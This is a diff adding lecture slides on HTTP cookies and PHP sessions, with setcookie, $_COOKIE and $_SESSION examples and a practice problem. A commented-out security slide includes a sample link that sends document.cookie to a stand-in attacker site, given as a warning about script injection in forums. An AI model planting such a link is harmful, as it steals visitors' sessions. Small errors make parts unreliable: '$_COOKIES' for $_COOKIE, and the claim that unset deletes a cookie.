@@ -1,0 +1,546 @@
+<!--#include virtual="commontop.html" -->
+		<title>Web Programming Step by Step, Lecture 25: Cookies and Sessions</title>
+	</head>
+
+	<body>
+		<div class="layout">
+			<div id="controls"><!-- DO NOT EDIT --></div>
+			<div id="currentSlide"><!-- DO NOT EDIT --></div>
+			<div id="header"></div>
+			<div id="footer">
+				<h1><em>Web Programming Step by Step</em>, Lecture 25</h1>
+				<h2>Cookies and Sessions</h2>
+			</div>
+		</div>
+
+		<div class="presentation">
+			<div class="slide">
+				<h1><a href="http://www.webstepbook.com/">Web Programming Step by Step</a></h1>
+				<h3>Lecture 25 <br /> Cookies and Sessions</h3>
+				<!--<h4>Reading: 11.4 - 11.5; Appendix A</h4>-->
+				<h4>References:
+					tizag.com <a href="http://www.tizag.com/phpT/phpsessions.php">sessions</a>,
+					<a href="http://www.tizag.com/phpT/phpcookies.php">cookies</a>;
+					<a href="http://www.codewalkers.com/c/a/Miscellaneous/Using-Sessions-in-PHP/">Codewalkers</a>
+				</h4>
+
+				<p class="license">
+					Except where otherwise noted, the contents of this presentation are Copyright 2009 Marty Stepp and Jessica Miller.
+				</p>
+
+				<div class="w3c">
+					<a href="http://validator.w3.org/check/referer"><img src="images/w3c-xhtml11.png" alt="Valid XHTML 1.1" /></a>
+					<a href="http://jigsaw.w3.org/css-validator/check/referer"><img src="images/w3c-css.png" alt="Valid CSS!" /></a>
+				</div>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Stateful client/server interaction</h1>
+
+				<div class="rightfigure">
+					<img src="images/amazon_cookie.png" alt="amazon cookie" />
+				</div>
+
+				<p>
+					<em>Sites like amazon.com seem to "know who I am."  How do they do this?  How does a client uniquely identify itself to a server, and how does the server provide specific content to each client?</em>
+				</p>
+
+				<ul>
+					<li>HTTP is a <span class="term">stateless</span> protocol; it simply allows a browser to request a single document from a web server</li>
+					<!--
+					<li>HTTP provides no support for longer, stateful transactions, where the client and server know about each other and exchange information</li>
+					-->
+					<li>in these slides, we'll learn about pieces of data called <span class="term">cookies</span> used to work around this problem, which are used as the basis of higher-level <span class="term">sessions</span> between clients and servers</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>What is a cookie?</h1>
+
+				<div class="rightfigure" style="width: 20%">
+					<img src="images/cookie_monster.jpg" style="width: 100%" alt="om nom nom" />				
+				</div>
+
+				<ul>
+					<li><a href="http://en.wikipedia.org/wiki/HTTP_cookie"><span class="term">cookie</span></a>: a small amount of information sent by a server to a browser, and then sent back by the browser on future page requests
+					<!--
+						<ul>
+						<li>the term &quot;cookie&quot; comes from an older networking term, &quot;magic cookie&quot;</li>
+						</ul>
+					-->
+					</li>
+					<li>cookies have many uses:
+						<ul>
+						<li>authentication</li>
+						<li>user tracking</li>
+						<li>maintaining user preferences, shopping carts, etc.</li>
+						</ul>
+					</li>
+					<li>a cookie's data consists of a single name/value pair, sent in the header of the client's HTTP GET or POST request</li>
+					</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>How cookies are sent</h1>
+
+				<div class="rightfigure">
+					<img src="images/cookie_exchange.png" alt="cookie exchange" />
+				</div>
+
+				<ul>
+					<li>when the browser requests a page, the server may send back a cookie(s) with it</li>
+					<li>if your server has previously sent any cookies to the browser, the browser will send them back on subsequent requests</li>
+				</ul>
+				
+				<ul style="margin-top: 3em">
+					<li>
+						alternate model: client-side JavaScript code can set/get cookies
+					</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Myths about cookies</h1>
+
+				<ul>
+					<li>Myths:
+						<ul>
+							<li>Cookies are like worms/viruses and can erase data from the user's hard disk.</li>
+							<li>Cookies are a form of spyware and can steal your personal information.</li>
+							<li>Cookies generate popups and spam.</li>
+							<li>Cookies are only used for advertising.</li>
+						</ul>
+					</li>
+					<li>Facts:
+						<ul>
+							<li>Cookies are only data, not program code.</li>
+							<li>Cookies cannot erase or read information from the user's computer.</li>
+							<li>Cookies are usually anonymous (do not contain personal information).</li>
+							<li>Cookies CAN be used to track your viewing habits on a particular site.</li>
+						</ul>
+					</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>How long does a cookie exist?</h1>
+
+				<ul>
+					<li><span class="term">session cookie</span> : the default type; a temporary cookie that is stored only in the browser's memory
+						<ul>
+							<li>when the browser is closed, temporary cookies will be erased</li>
+							<li>can not be used for tracking long-term information</li>
+							<li>safer, because no programs other than the browser can access them</li>
+						</ul>
+					</li>
+					<li><span class="term">persistent cookie</span> : one that is stored in a file on the browser's computer
+						<ul>
+							<li>can track long-term information</li>
+							<li>potentially less secure, because users (or programs they run) can open cookie files, see/change the cookie values, etc.</li>
+						</ul>
+					</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Where are the cookies on my computer?</h1>
+
+				<div class="rightfigure" style="width: 20%">
+					<img src="images/delete_cookies.jpg" style="width: 100%" alt="good enough for me" />
+				</div>
+
+				<ul>
+					<li>IE: <var>HomeDirectory</var>\Cookies
+						<ul>
+							<li>e.g. C:\Documents and Settings\jsmith\Cookies</li>
+							<li>each is stored as a <code>.txt</code> file similar to the site's domain name</li>
+						</ul>
+					</li>
+					<li>Firefox: <var>HomeDirectory</var>\.mozilla\firefox\<var>???</var>.default\cookies.txt
+						<ul>
+							<li>view cookies in Firefox preferences: Privacy, Show Cookies...<br />
+							<img src="images/firefox_cookies.png" alt="Firefox cookies" /></li>
+						</ul>
+					</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Cookies in JavaScript</h1>
+
+				<pre class="examplecode js">
+document.cookie = &quot;username=smith;password=12345&quot;;
+</pre>
+
+				<pre class="examplecode html">
+<span class="comment">&lt;!-- using the instructor-provided Cookies.js class --&gt;</span>
+&lt;script <em>src=&quot;Cookies.js&quot;</em> type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
+</pre>
+
+				<pre class="examplecode js">
+Cookies.set(&quot;username&quot;, &quot;smith&quot;);
+...
+alert(Cookies.get(&quot;username&quot;));   <span class="comment">// smith</span>
+</pre>
+
+
+				<ul>
+					<li>JS has a global <code>document.cookie</code> field (a string)</li>
+					<li>
+						you can manually set/get cookie data from this field (sep. by <code>;</code>), and it will be saved in the browser
+					</li>
+					<li>
+						we have written a <a href="Cookies.js">Cookies.js</a> helper class with methods <code>set</code>, <code>get</code>, <code>exists</code>, <code>remove</code>, and <code>remember</code>
+					</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Setting a cookie in PHP</h1>
+
+				<!--
+				http://www.w3schools.com/php/func_http_setcookie.asp
+				-->
+
+				<pre class="syntaxtemplate php">
+setcookie(&quot;<var>name</var>&quot;, &quot;<var>value</var>&quot;);
+</pre>
+
+				<pre class="examplecode php">
+setcookie(&quot;username&quot;, &quot;martay&quot;);
+setcookie(&quot;favoritecolor&quot;, &quot;blue&quot;);
+</pre>
+
+				<ul>
+					<li><code>setcookie</code> causes your script to send a cookie to the user's browser</li>
+					<li><code>setcookie</code> must be called before any output statements (HTML blocks, <code>print</code>, or <code>echo</code>)</li>
+					<li>you can set multiple cookies (20-50) per user, each up to 3-4K bytes</li>
+				</ul>
+
+				<div class="handout">
+					<ul>
+						<li>technically, a cookie is just part of an HTTP header, and it could be set using PHP's <code>header</code> function (but this is less convenient, so you would not want to do this):</li>
+
+							<pre class="examplecode php">
+header(&quot;Set-Cookie: username=martay; path=/; secure&quot;);
+</pre>
+					</ul>
+				</div>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Retrieving information from a cookie</h1>
+
+				<pre class="syntaxtemplate php">
+$<var>variable</var> = $_COOKIE[&quot;<var>name</var>&quot;];   <span class="comment"># retrieve value of the cookie</span>
+</pre>
+
+				<pre class="examplecode php">
+if (isset(<em>$_COOKIE[&quot;username&quot;]</em>)) {
+	$username = <em>$_COOKIE[&quot;username&quot;]</em>;
+	print(&quot;Welcome back, $username.\n&quot;);
+} else {
+	print(&quot;Never heard of you.\n&quot;);
+}
+print(&quot;All cookies received:\n&quot;);
+print_r(<em>$_COOKIE</em>);
+</pre>
+
+				<ul>
+					<li>any cookies sent by client are stored in <code>$_COOKIES</code> associative array</li>
+					<li>use <a href="http://us2.php.net/isset"><code>isset</code></a> function to see whether a given cookie name exists</li>
+				</ul>
+
+				<div class="handout">
+					<ul>
+						<li><a href="http://us2.php.net/manual/en/function.unset.php"><code>unset</code></a> function deletes a cookie</li>
+					</ul>
+				</div>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Setting a persistent cookie in PHP</h1>
+
+				<pre class="syntaxtemplate php">
+setcookie(&quot;<var>name</var>&quot;, &quot;<var>value</var>&quot;, <var>timeout</var>);
+</pre>
+
+				<pre class="examplecode php">
+$expireTime = <em>time()</em> + 60*60*24*7;   <span class="comment"># 1 week from now</span>
+setcookie(&quot;CouponNumber&quot;, &quot;389752&quot;<em>, $expireTime</em>);
+setcookie(&quot;CouponValue&quot;, &quot;100.00&quot;<em>, $expireTime</em>);
+</pre>
+
+				<ul>
+					<li>to set a persistent cookie, pass a third parameter for its timeout in seconds</li>
+					<li><a href=">http://us2.php.net/time"><code>time</code></a> function returns the current time in seconds
+						<ul>
+							<li><a href="http://us2.php.net/manual/en/function.date.php"><code>date</code></a> function can convert a time in seconds to a readable date</li>
+						</ul>
+					</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Removing a persistent cookie</h1>
+
+				<pre class="syntaxtemplate php">
+setcookie(&quot;<var>name</var>&quot;, <em>&quot;&quot;, time() - 1</em>);
+</pre>
+
+				<pre class="examplecode php">
+setcookie(&quot;CouponNumber&quot;, &quot;&quot;, time() - 1);
+</pre>
+
+				<ul>
+					<li>if the server wants to remove a persistent cookie, it should set it again, passing a timeout that is prior to the present time</li>
+				</ul>
+			</div>
+
+
+
+			<!--
+			<div class="slide">
+			<h1>Cookies and security</h1>
+
+			All browsers are following the security rule that your cookies are sent back only to your Web servers. They will not be sent to other Webmaster's Web server directly. However, other Webmaster may design some malicious JavaScript codes to steal cookies created by your PHP pages. For example, if you allow visitors to post messages in your forum, comment area, or guestbooks with hyper links. A bad Webmaster who owns a Web site called www.badwebmaster.com could post a message like this on your Web site with a malicious hyper link:
+
+			<a href="#" onclick="window.location='http://www.badwebmaster.com
+				/stole.cgi?text='+escape(document.cookie); return false;">
+				Click here to get your free gift!
+
+			If your visitor clicks this hyper link, all of your cookie values will be sent to this bad Webmaster's CGI program as part of the GET URL (not as cookies).
+
+			So check your forum, comment book or guestbook program. And do not allow visitors to post messages with client side scripts.
+
+			</div>
+			-->
+
+
+
+			<div class="slide">
+				<h1>What is a session?</h1>
+
+				<ul>
+					<li><span class="term">session</span>: an abstract concept to represent a series of HTTP requests and responses between a specific Web browser and server
+						<ul>
+							<li>HTTP doesn't support the notion of a session, but PHP does</li>
+						</ul>
+					</li>
+
+					<li>sessions vs. cookies:
+						<ul>
+							<li>a cookie is data stored on the client</li>
+							<li>a session's data is stored on the server (only 1 session per client)</li>
+						</ul>
+					</li>
+
+					<li>sessions are often built on top of cookies:
+						<ul>
+							<li>the only data the client stores is a cookie holding a unique <span class="term">session ID</span></li>
+							<li>on each page request, the client sends its session ID cookie, and the server uses this to find and retrieve the client's session data</li>
+						</ul>
+					</li>
+				</ul>
+			</div>
+
+
+
+			<!-- ***
+			shopping cart example
+			-->
+
+			<!--
+			<div class="slide">
+			<h1>Characteristics of sessions</h1>
+
+			<ul>
+			<li>Information or state must be stored. For example, a selected bottle of wine in a shopping cart, a customer name, or a credit card number must be maintained across multiple HTTP requests.</li>
+			<li>Each HTTP request must carry an identifier that allows the server to process the request in the context of the stored state. For example, when an order is submitted, it must be processed with the correct items and customer details.</li>
+			<li>Sessions need to have a timeout . Otherwise, if a user leaves the web site, there is no way the server can tell when the session should end</li>
+			</ul>
+
+			</div>
+			-->
+
+
+
+			<div class="slide">
+				<h1>How sessions are established</h1>
+
+				<div class="rightfigure">
+					<img src="images/session.gif" style="width: 100%" alt="session" />
+				</div>
+
+				<ul>
+					<li>client's browser makes an initial request to the server</li>
+					<li>server notes client's IP address/browser, stores some local session data, and sends a session ID back to client</li>
+					<li>client sends that same session ID back to server on future requests</li>
+					<li>server uses session ID to retrieve the data for the client's session later, like a ticket given at a coat-check room</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Sessions in PHP: <code>session_start</code></h1>
+
+				<pre class="examplecode php">
+session_start();
+</pre>
+
+				<ul>
+					<li><code>session_start</code> signifies your script wants a session with the user
+						<ul>
+							<li>must be called at the top of your script, before any HTML output is produced</li>
+						</ul>
+					</li>
+					<li>when you call <code>session_start</code>:
+						<ul>
+							<li>if the server hasn't seen this user before, a new session is created</li>
+							<li>otherwise, existing session data is loaded into <code>$_SESSION</code> associative array</li>
+							<li>you can store data in <code>$_SESSION</code> and retrieve it on future pages</li>
+						</ul>
+					</li>
+					<li><a href="http://us.php.net/manual/en/ref.session.php">complete list of PHP session functions</a></li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Accessing session data</h1>
+
+				<pre class="syntaxtemplate php">
+$_SESSION[&quot;<var>name</var>&quot;] = <var>value</var>;        <span class="comment"># store session data</span>
+$<var>variable</var> = $_SESSION[&quot;<var>name</var>&quot;];     <span class="comment"># read session data</span>
+if (isset($_SESSION[&quot;<var>name</var>&quot;])) {  <span class="comment"># check for session data</span>
+</pre>
+
+				<pre class="examplecode php">
+if (<em>isset($_SESSION[&quot;points&quot;])</em>) {
+	$points = <em>$_SESSION[&quot;points&quot;]</em>;
+	print(&quot;You've earned $points points.\n&quot;);
+} else {
+	<em>$_SESSION[&quot;points&quot;]</em> = 0;  <span class="comment"># default</span>
+}
+</pre>
+
+				<ul>
+					<li>the <code>$_SESSION</code> associative array reads/stores all session data</li>
+					<li>use <a href="http://us2.php.net/isset"><code>isset</code></a> function to see whether a given value is in the session</li>
+				</ul>
+
+				<!--
+				$_SESSION[]
+				isset
+				unset
+
+				if ($_SESSION && array_key_exists("lastsearch", $_SESSION)) {
+				if (isset($_SESSION["lastsearch"])) {
+
+				-->
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Where is session data stored?</h1>
+
+				<div class="rightfigure">
+					<img src="images/firefox_session_cookie.png" alt="session cookie" />
+				</div>
+
+				<ul>
+					<li>on the client, the session ID is stored as a cookie with the name <code>PHPSESSID</code></li>
+					<li>on the server, session data are stored as temporary files such as
+						<code>/tmp/sess_fcc17f071...</code>
+					</li>
+					<li>you can find out (or change) the folder where session data is saved using the <a href="http://us.php.net/manual/en/function.session-save-path.php"><code>session_save_path</code></a> function</li>
+					<li>for very large applications, session data can be stored into a SQL database (or other destination) instead using the <a href="http://www.php.net/manual/en/function.session-set-save-handler.php"><code>session_set_save_handler</code></a> function</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Browsers that don't support cookies</h1>
+
+				<pre class="examplecode php">
+session_start();   <span class="comment"># same as usual</span>
+
+<span class="comment"># Generate a URL to link to one of our site's pages
+# (you probably won't ever need to do this)</span>
+$orderUrl = &quot;/order.php<em>?PHPSESSID=</em>&quot; . <em>session_id()</em>;
+</pre>
+
+				<ul>
+					<li>if a client's browser doesn't support cookies, it can still send a session ID as a query string parameter named <code>PHPSESSID</code>
+						<ul>
+							<li>this is done automatically; <code>session_start</code> detects whether the browser supports cookies and chooses the right method</li>
+						</ul>
+					</li>
+					<li>if necessary (such as to build a URL for a link on the page), the server can find out the client's session ID by calling the <a href="http://us.php.net/manual/en/function.session-id.php"><code>session_id</code></a> function</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Session timeout</h1>
+
+				<ul>
+					<li>because HTTP is stateless, it is hard for the server to know when a user has finished a session</li>
+					<li>ideally, user explicitly logs out, but many users don't</li>
+					<li>client deletes session cookies when browser closes</li>
+					<li>server automatically cleans up old sessions after a period of time
+						<ul>
+							<li>old session data consumes resources and may present a security risk</li>
+							<li>adjustable in PHP server settings or with <a href="http://us2.php.net/manual/en/function.session-cache-expire.php"><code>session_cache_expire</code></a> function</li>
+							<li>you can explicitly delete a session by calling <a href="http://us.php.net/manual/en/function.session-destroy.php"><code>session_destroy</code></a></li>
+						</ul>
+					</li>
+				</ul>
+			</div>
+
+
+
+			<div class="slide">
+				<h1>Practice problem: remembering query</h1>
+
+				<ul>
+					<li>Modify the <code>movie.php</code> movie search script from previous lectures so that it remembers the current user's last query (if any), and offers the user a chance to search for it again, such as:
+
+						<ul>
+							<li>Welcome back!  Would you like to repeat your recent search for <a href="movie.php?movie=Fight%20Club">Fight Club</a>?</li>
+						</ul>
+					</li>
+
+					<li class="incremental">Pretend that the movie-search program is running on a system that wants to limit repeated usage by particular users.  Add code so that a given user can only conduct one session per day.</li>
+				</ul>
+			</div>
+
+<!--#include virtual="commonbottom.html" -->
